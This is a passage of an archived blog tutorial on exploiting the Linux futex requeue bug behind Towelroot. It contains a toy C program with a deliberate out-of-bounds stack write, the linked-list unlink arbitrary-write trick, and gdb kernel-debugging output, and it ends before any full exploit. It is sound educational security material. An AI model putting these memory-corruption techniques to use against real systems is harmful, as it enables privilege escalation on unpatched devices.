          <td id="file-simplebug-c-L106" class="blob-num js-line-number js-code-nav-line-number" data-line-number="106"></td>
          <td id="file-simplebug-c-LC106" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L107" class="blob-num js-line-number js-code-nav-line-number" data-line-number="107"></td>
          <td id="file-simplebug-c-LC107" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L108" class="blob-num js-line-number js-code-nav-line-number" data-line-number="108"></td>
          <td id="file-simplebug-c-LC108" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L109" class="blob-num js-line-number js-code-nav-line-number" data-line-number="109"></td>
          <td id="file-simplebug-c-LC109" class="blob-code blob-code-inner js-file-line">	buf[element_number] = (<span class="pl-k">int</span>)value;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L110" class="blob-num js-line-number js-code-nav-line-number" data-line-number="110"></td>
          <td id="file-simplebug-c-LC110" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L111" class="blob-num js-line-number js-code-nav-line-number" data-line-number="111"></td>
          <td id="file-simplebug-c-LC111" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L112" class="blob-num js-line-number js-code-nav-line-number" data-line-number="112"></td>
          <td id="file-simplebug-c-LC112" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L113" class="blob-num js-line-number js-code-nav-line-number" data-line-number="113"></td>
          <td id="file-simplebug-c-LC113" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> * argv[])</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L114" class="blob-num js-line-number js-code-nav-line-number" data-line-number="114"></td>
          <td id="file-simplebug-c-LC114" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L115" class="blob-num js-line-number js-code-nav-line-number" data-line-number="115"></td>
          <td id="file-simplebug-c-LC115" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> list mylist;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L116" class="blob-num js-line-number js-code-nav-line-number" data-line-number="116"></td>
          <td id="file-simplebug-c-LC116" class="blob-code blob-code-inner js-file-line">	mylist.<span class="pl-smi">head</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L117" class="blob-num js-line-number js-code-nav-line-number" data-line-number="117"></td>
          <td id="file-simplebug-c-LC117" class="blob-code blob-code-inner js-file-line">	mylist.<span class="pl-smi">tail</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L118" class="blob-num js-line-number js-code-nav-line-number" data-line-number="118"></td>
          <td id="file-simplebug-c-LC118" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> pos;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L119" class="blob-num js-line-number js-code-nav-line-number" data-line-number="119"></td>
          <td id="file-simplebug-c-LC119" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">char</span> *val;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L120" class="blob-num js-line-number js-code-nav-line-number" data-line-number="120"></td>
          <td id="file-simplebug-c-LC120" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L121" class="blob-num js-line-number js-code-nav-line-number" data-line-number="121"></td>
          <td id="file-simplebug-c-LC121" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">/*</span>we have one parameter<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L122" class="blob-num js-line-number js-code-nav-line-number" data-line-number="122"></td>
          <td id="file-simplebug-c-LC122" class="blob-code blob-code-inner js-file-line">	pos = -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L123" class="blob-num js-line-number js-code-nav-line-number" data-line-number="123"></td>
          <td id="file-simplebug-c-LC123" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (argc==<span class="pl-c1">3</span>) {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L124" class="blob-num js-line-number js-code-nav-line-number" data-line-number="124"></td>
          <td id="file-simplebug-c-LC124" class="blob-code blob-code-inner js-file-line">		pos = <span class="pl-c1">atoi</span>(argv[<span class="pl-c1">1</span>]);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L125" class="blob-num js-line-number js-code-nav-line-number" data-line-number="125"></td>
          <td id="file-simplebug-c-LC125" class="blob-code blob-code-inner js-file-line">		val = argv[<span class="pl-c1">2</span>];</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L126" class="blob-num js-line-number js-code-nav-line-number" data-line-number="126"></td>
          <td id="file-simplebug-c-LC126" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L127" class="blob-num js-line-number js-code-nav-line-number" data-line-number="127"></td>
          <td id="file-simplebug-c-LC127" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L128" class="blob-num js-line-number js-code-nav-line-number" data-line-number="128"></td>
          <td id="file-simplebug-c-LC128" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>we will use pos: <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, pos);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L129" class="blob-num js-line-number js-code-nav-line-number" data-line-number="129"></td>
          <td id="file-simplebug-c-LC129" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L130" class="blob-num js-line-number js-code-nav-line-number" data-line-number="130"></td>
          <td id="file-simplebug-c-LC130" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_add_new</span>(&amp;mylist, <span class="pl-s"><span class="pl-pds">"</span>Alpha<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L131" class="blob-num js-line-number js-code-nav-line-number" data-line-number="131"></td>
          <td id="file-simplebug-c-LC131" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_add_new</span>(&amp;mylist, <span class="pl-s"><span class="pl-pds">"</span>Beta<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L132" class="blob-num js-line-number js-code-nav-line-number" data-line-number="132"></td>
          <td id="file-simplebug-c-LC132" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">print_with_end_of_list</span>(&amp;mylist);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L133" class="blob-num js-line-number js-code-nav-line-number" data-line-number="133"></td>
          <td id="file-simplebug-c-LC133" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">buggy_print_with_end_of_list</span>(&amp;mylist);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L134" class="blob-num js-line-number js-code-nav-line-number" data-line-number="134"></td>
          <td id="file-simplebug-c-LC134" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L135" class="blob-num js-line-number js-code-nav-line-number" data-line-number="135"></td>
          <td id="file-simplebug-c-LC135" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">a_function_to_exploit</span>(pos, val);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L136" class="blob-num js-line-number js-code-nav-line-number" data-line-number="136"></td>
          <td id="file-simplebug-c-LC136" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L137" class="blob-num js-line-number js-code-nav-line-number" data-line-number="137"></td>
          <td id="file-simplebug-c-LC137" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_print</span>(&amp;mylist);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L138" class="blob-num js-line-number js-code-nav-line-number" data-line-number="138"></td>
          <td id="file-simplebug-c-LC138" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L139" class="blob-num js-line-number js-code-nav-line-number" data-line-number="139"></td>
          <td id="file-simplebug-c-LC139" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">/*</span>this is just a demo, i am skipping the cleanup code<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L140" class="blob-num js-line-number js-code-nav-line-number" data-line-number="140"></td>
          <td id="file-simplebug-c-LC140" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L141" class="blob-num js-line-number js-code-nav-line-number" data-line-number="141"></td>
          <td id="file-simplebug-c-LC141" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L142" class="blob-num js-line-number js-code-nav-line-number" data-line-number="142"></td>
          <td id="file-simplebug-c-LC142" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/yohanes/9e4381581a404f742dad9c48877dbc24/raw/2f853ea87460245a1ecc7075f7d8d290f84b1ad8/simplebug.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/yohanes/9e4381581a404f742dad9c48877dbc24#file-simplebug-c">
          simplebug.c
        </a>
        hosted with <img draggable="false" role="img" class="emoji" alt="❤" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/2764.svg"> by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

<p>First, you will need to compile this in 32 bit mode, so the sizeof int is the same as the size of pointer (32 bit), don’t use any optimization when compiling.</p>
<p><code>gcc -m32 list1.c</code></p>
<p>Then run the resulting executable without any parameters it will print something like this:</p>
<pre class="wp-block-preformatted">$ ./mylist 
we will use pos: -1
Not a buggy function
Value = Alpha
Value = Beta
Value = --END OF LIST--
a buggy function, here is the location of value on stack 0xffd724a4
Value = Alpha
Value = Beta
Value = --END OF LIST--
location of buf[0] is 0xffd72488
location of buf[1] is 0xffd7248c
location of buf[2] is 0xffd72490
location of buf[3] is 0xffd72494
location of buf[4] is 0xffd72498
location of buf[5] is 0xffd7249c
location of buf[6] is 0xffd724a0
location of buf[7] is 0xffd724a4
location of buf[8] is 0xffd724a8
location of buf[9] is 0xffd724ac
Value = Alpha
Value = Beta
Value = --END OF LIST--
</pre>
<p>Notice the location of value on stack, which in this example is 0xffd724a4. Notice that it is the same as the address of buf[7]. Now run the test again, like this:</p>
<pre class="wp-block-preformatted">$./mylist 7 HACKED
we will use pos: 7
Not a buggy function
Value = Alpha
Value = Beta
Value = --END OF LIST--
a buggy function, here is the location of value on stack 0xffd3bd34
Value = Alpha
Value = Beta
Value = --END OF LIST--
Value = Alpha
Value = Beta
Value = HACKED
</pre>
<p>There is no assignment of the value “HACKED” to the list element, but it printed the word “HACKED”. Why this works? because we assign to the exact memory location in stack where “value” was stored. Also note that the location printed is now different because of <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>, but because the position is the same in the stack, element number 7 is also relocated to the same address.</p>
<p>Now try out if you use other value than 7, also try a very small or very large value. You can also try this with stack protector on:</p>
<p><code>gcc -m32 -fstack-protector list1.c </code></p>
<p>The element that matched the address will be different (may be 7 becomes 8 or 6), but the exploit will still work if you adjust the element number with the matching address.</p>
<p>In this example, I made a very convenient function that makes the “exploit” easy (named a_function_to_exploit). In the real world, if we want to modify certain location in stack, we need to find a function that has a correct “depth” (that is: the stack size usage is at least the same as the function that we are trying to exploit), and we need to be able to manipulate the value on that stack depth. To understand about stack depth, you can comment the dummy_var1/dummy_var2/dummy_var3, compile, and see the stack address change. You can also see that if the function is optimized, certain variables are no longer in stack (moved to registers if possible).</p>
<h3>Writing using list</h3>
<p>Once you know how to manipulate an element of the list, you can write to certain memory address. On all exploits what you want to do is to write something to an address. To make this part short and to show my point, I will give an example for a simple linked list. If we have this:</p>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/ad717215a9cf1fb5f53dd1452b344132.js.下載" type="text/javascript"></script><link rel="stylesheet" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist93138666" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-noderemove-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="noderemove.c">
        <tbody><tr>
          <td id="file-noderemove-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-noderemove-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">node_remove</span>(<span class="pl-k">struct</span> node *n)</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-noderemove-c-LC2" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-noderemove-c-LC3" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">//</span>lets skip handling for first and last element,</span></td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-noderemove-c-LC4" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">//</span>assume that we only delete something in the middle</span></td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-noderemove-c-LC5" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *prevnode = n-&gt;<span class="pl-smi">prev</span>;</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-noderemove-c-LC6" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *nextnode = n-&gt;<span class="pl-smi">next</span>;</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-noderemove-c-LC7" class="blob-code blob-code-inner js-file-line">	nextnode-&gt;<span class="pl-smi">prev</span> = prevnode;</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-noderemove-c-LC8" class="blob-code blob-code-inner js-file-line">	prevnode-&gt;<span class="pl-smi">next</span> = nextnode;</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-noderemove-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-noderemove-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-noderemove-c-LC10" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/yohanes/ad717215a9cf1fb5f53dd1452b344132/raw/44dcdec6ac0c7d1bc300aba5e581d6c0649355a9/noderemove.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/yohanes/ad717215a9cf1fb5f53dd1452b344132#file-noderemove-c">
          noderemove.c
        </a>
        hosted with <img draggable="false" role="img" class="emoji" alt="❤" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/2764.svg"> by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

<p>Assume that we can control the content of n, we can write almost arbitrary value to arbitrary address. Lets assume that prev is in offset 4 of the node, and next is in offset 8. Please note that this structure assignment:</p>
<pre class="wp-block-preformatted">A-&gt;B = C;</pre>
<p>is the same as:</p>
<pre class="wp-block-preformatted">*(A + offset_B) = C;</pre>
<p>Lets assume we want to overwrite memory at location X with value Y. First prepare a fake node for the “next”, this fakenext is located at memory location Y (the location of the fake node is the value that we want to write), Of course this is limited to accessible memory space (so segmentation fault will not happen).</p>
<p>If we just want to change a value from 0 (for example: a variable containing number 0 if something is not allowed) to any non zero number (something is allowed), then we can use any number (we don’t even need a fake element, just a valid pointer to the “next” element).</p>
<pre class="wp-block-preformatted">n-&gt;next = fakenext;<br>n-&gt;prev = X-8</pre>
<p>so when we call, this is what happens:</p>
<pre class="wp-block-preformatted">(n-&gt;next)-&gt;prev = n-&gt;prev;<br>(n-&gt;prev)-&gt;next = n-&gt;next</pre>
<p>since n-&gt;next points to our fakenode</p>
<pre class="wp-block-preformatted">(fakenode)-&gt;prev = n-&gt;prev;<br>(n-&gt;prev)-&gt;next = fakenode</pre>
<p>You can read more about this kind of list manipulation by searching google for heap exploits. For example, there are several articles about exploiting memory allocator in Phrack that uses list in the implementation (<a href="http://phrack.org/issues/57/8.html">Vudo Malloc Tricks</a>, <a href="http://phrack.org/issues/57/9.html">Once upon a free</a>, <a href="http://phrack.org/issues/61/6.html">Advanced Doug lea’s malloc exploits</a> and <a href="http://phrack.org/issues/66/10.html">Malloc Des-Maleficarum</a>).</p>
<p>These two things: that stack content can be manipulated, and that a manipulated list can be used to write to any address is the basis of the futex exploit.</p>
<h3>On to the Kernel</h3>
<p>Now lets go to where the bug is on the kernel.</p>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/cef4b5af2e7366b7928430c7032280b4.js.下載" type="text/javascript"></script><link rel="stylesheet" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist93138796" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-futex-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="futex.c">
        <tbody><tr>
          <td id="file-futex-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-futex-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">int</span> <span class="pl-en">futex_wait_requeue_pi</span>(u32 __user *uaddr, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> flags,</td>
        </tr>
        <tr>
          <td id="file-futex-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-futex-c-LC2" class="blob-code blob-code-inner js-file-line">  u32 val, <span class="pl-c1">ktime_t</span> *abs_time, u32 bitset,</td>
        </tr>
        <tr>
          <td id="file-futex-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-futex-c-LC3" class="blob-code blob-code-inner js-file-line">  u32 __user *uaddr2)</td>
        </tr>
        <tr>
          <td id="file-futex-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-futex-c-LC4" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-futex-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-futex-c-LC5" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> hrtimer_sleeper timeout, *to = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-futex-c-LC6" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> rt_mutex_waiter rt_waiter;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-futex-c-LC7" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> rt_mutex *pi_mutex = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-futex-c-LC8" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> futex_hash_bucket *hb;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-futex-c-LC9" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">union</span> futex_key key2 = FUTEX_KEY_INIT;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-futex-c-LC10" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> futex_q q = futex_q_init;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-futex-c-LC11" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">int</span> res, ret;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-futex-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-futex-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-futex-c-LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span>...</span></td>
        </tr>
        <tr>
          <td id="file-futex-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-futex-c-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-futex-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-futex-c-LC15" class="blob-code blob-code-inner js-file-line">  q.<span class="pl-smi">rt_waiter</span> = &amp;rt_waiter;</td>
        </tr>
        <tr>
          <td id="file-futex-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-futex-c-LC16" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-futex-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-futex-c-LC17" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span>...</span></td>
        </tr>
        <tr>
          <td id="file-futex-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-futex-c-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-futex-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-futex-c-LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span>futex_wait_queue_me(hb, &amp;q, to);</span></td>
        </tr>
        <tr>
          <td id="file-futex-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-futex-c-LC20" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-futex-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-futex-c-LC21" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">if</span> (!q.<span class="pl-smi">rt_waiter</span>) {</td>
        </tr>
        <tr>
          <td id="file-futex-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-futex-c-LC22" class="blob-code blob-code-inner js-file-line">  </td>
        </tr>
        <tr>
          <td id="file-futex-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-futex-c-LC23" class="blob-code blob-code-inner js-file-line">  <span class="pl-c"><span class="pl-c">//</span>...</span></td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/yohanes/cef4b5af2e7366b7928430c7032280b4/raw/2830170ca02d04253dddd43f5125192a310466fd/futex.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/yohanes/cef4b5af2e7366b7928430c7032280b4#file-futex-c">
          futex.c
        </a>
        hosted with <img draggable="false" role="img" class="emoji" alt="❤" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/2764.svg"> by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

<p>You can also see the full code for <a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=3.4#L2263"><code>futex_wait_requeue_pi()</code></a>.</p>
<p>In my simple userland code, there is a variable called <code>instack</code> that we want to manipulate, this time, we are interested in <code>rt_waiter</code>. In the case where futex requeue is called with <code>uaddr1==uaddr2</code>, the code path will cause <code>q.rt_waiter</code> to be NULL, but actually the waiter is still linked in the waiter list.</p>
<pre class="wp-block-preformatted">static int futex_requeue(u32 __user *uaddr1, unsigned int flags,u32 __user *uaddr2, int nr_wake, int nr_requeue,u32 *cmpval, int requeue_pi)</pre>
<p>And the source code for <a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=3.4#L1245"><code>futex_requeue()</code></a></p>
<p>Now we need a corresponding function for <code>a_function_to_exploit</code>. This syscall must be “deep” enough to touch the <code>rt_waiter</code>, so a syscall that doesn’t have a local variable, and doesn’t call other function is not usable.</p>
<p>First lets examine the function when we call it. From now on to show certain things, I will show how it looks in gdb that is connected to qemu for kernel debugging. Since I want to show things about towelroot, I am using qemu with ARM kernel. I am using this official guide <a href="https://source.android.com/source/building-kernels.html">for building Android kernel</a> combined with <a href="https://stackoverflow.com/questions/21274910/how-to-compile-android-goldfish-3-4-kernel-and-run-on-emulator">stack overflow answer</a>. When compiling the kernel, <b>don’t forget to enable debug symbol</b>. I created an Android 4.3 AVD, and started the emulator with this:</p>
<p><code><br>
~/adt-bundle-linux/sdk/tools/emulator-arm -show-kernel -kernel arch/arm/boot/zImage -avd joeavd -no-boot-anim -no-skin -no-audio -no-window -logcat *:v -qemu -monitor telnet::4444,server -s </code></p>
<p>I can control the virtual machine via telnet localhost 444, and debug using gdb:</p>
<p><code>$ arm-eabi-gdb vmlinux</code></p>
<p>To connect and start debugging:</p>
<p><code>(gdb) target remote :1234</code></p>
<p>Why do I use GDB? Because this is the easiest way to get size of structure and to know what optimizations the compiler did. Lets break on the <code>futex_wait_requeue_pi</code>:</p>
<pre class="wp-block-preformatted">Breakpoint 6, futex_wait_requeue_pi (uaddr=0xb6e8be68, flags=1, val=0, abs_time=0x0, bitset=4294967295, uaddr2=0xb6e8be6c) at kernel/futex.c:2266
2266    {
(gdb) list
2261     * &lt;0 - On error
2262     */
2263    static int futex_wait_requeue_pi(u32 __user *uaddr, unsigned int flags,
2264                                     u32 val, ktime_t *abs_time, u32 bitset,
2265                                     u32 __user *uaddr2)
2266    {
2267            struct hrtimer_sleeper timeout, *to = NULL;
2268            struct rt_mutex_waiter rt_waiter;
2269            struct rt_mutex *pi_mutex = NULL;
2270            struct futex_hash_bucket *hb;
(gdb) list
2271            union futex_key key2 = FUTEX_KEY_INIT;
2272            struct futex_q q = futex_q_init;
2273            int res, ret;
</pre>
<p>We can see the structures</p>
<pre class="wp-block-preformatted">(gdb) ptype timeout
type = struct hrtimer_sleeper {
    struct hrtimer timer;
    struct task_struct *task;
}

(gdb) ptype rt_waiter
type = struct rt_mutex_waiter {
    struct plist_node list_entry;
    struct plist_node pi_list_entry;
    struct task_struct *task;
    struct rt_mutex *lock;
}
</pre>
<p>We can also check the backtrace of this function</p>
<pre class="wp-block-preformatted">(gdb) bt
#0  futex_wait_requeue_pi (uaddr=0xb6e8be68, flags=1, val=0, abs_time=0x0, bitset=4294967295, uaddr2=0xb6e8be6c) at kernel/futex.c:2266
#1  0xc0050e54 in do_futex (uaddr=0xb6e8be68, op=, val=0, timeout=, uaddr2=0xb6e8be6c, val2=0, val3=3068706412)
    at kernel/futex.c:2668
#2  0xc005100c in sys_futex (uaddr=0xb6e8be68, op=11, val=0, utime=, uaddr2=0xb6e8be6c, val3=0) at kernel/futex.c:2707
#3  0xc000d680 in ?? ()
#4  0xc000d680 in ?? ()
</pre>
<p>We can print out the size of the structures:</p>
<pre class="wp-block-preformatted">(gdb) print sizeof(rt_waiter)
$1 = 48
(gdb) print sizeof(timeout)
$2 = 56
(gdb) print sizeof(to)
$3 = 4
(gdb) print sizeof(q)
$4 = 56
(gdb) print sizeof(hb)
$5 = 4
</pre>
<p>We can look at the addresses of things, in this case, the variable <code>pi_mutex</code> is optimized as register, so we can’t access the variable address.</p>
<pre class="wp-block-preformatted">(gdb) print &amp;key2
$6 = (union futex_key *) 0xd801de04
(gdb) print &amp;timeout
$7 = (struct hrtimer_sleeper *) 0xd801de40
(gdb) print *&amp;to
Can't take address of "to" which isn't an lvalue.
(gdb) print &amp;rt_waiter
$8 = (struct rt_mutex_waiter *) 0xd801de10
(gdb) print &amp;pi_mutex
Can't take address of "pi_mutex" which isn't an lvalue.
